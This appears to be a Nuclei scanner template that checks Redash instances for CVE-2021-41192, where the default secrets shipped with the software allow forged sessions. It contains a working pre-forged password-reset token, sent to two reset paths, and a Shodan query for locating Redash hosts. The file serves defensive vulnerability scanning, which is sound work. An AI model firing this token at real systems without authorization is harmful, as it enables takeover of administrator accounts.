id: CVE-2021-41192

info:
  name: Redash Setup Configuration - Default Secrets Disclosure
  author: bananabr
  severity: medium
  description: Redash Setup Configuration is vulnerable to default secrets disclosure (Insecure Default Initialization of Resource). If an admin sets up Redash versions <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY` environment variables, a default value is used for both that is the same across all installations. In such cases, the instance is vulnerable to attackers being able to forge sessions using the known default value.
  remediation: |
    Remove or update the default secrets in the Redash setup configuration file.
  reference:
    - https://hackerone.com/reports/1380121
    - https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41192
    - https://github.com/getredash/redash/commit/ce60d20c4e3d1537581f2f70f1308fe77ab6a214
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-41192
    cwe-id: CWE-1188
    epss-score: 0.00805
    epss-percentile: 0.79807
    cpe: cpe:2.3:a:redash:redash:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: "redash"
    product: "redash"
    shodan-query: http.favicon.hash:698624197
  tags: hackerone,cve,cve2021,redash,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
      - "{{BaseURL}}/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Enter your new password:"
          - "redash"
        condition: and

      - type: status
        status:
          - 200

# digest: 490a0046304402205596626898953b7e98931664ccc3ac18b92c7e09e8489a3be3128c39bf69a762022002fd2f0651db106d4eff918816107812e7ddc4203f328cc7a161d7d3b9448e16:922c64590222798bb761d5b6d8e72950
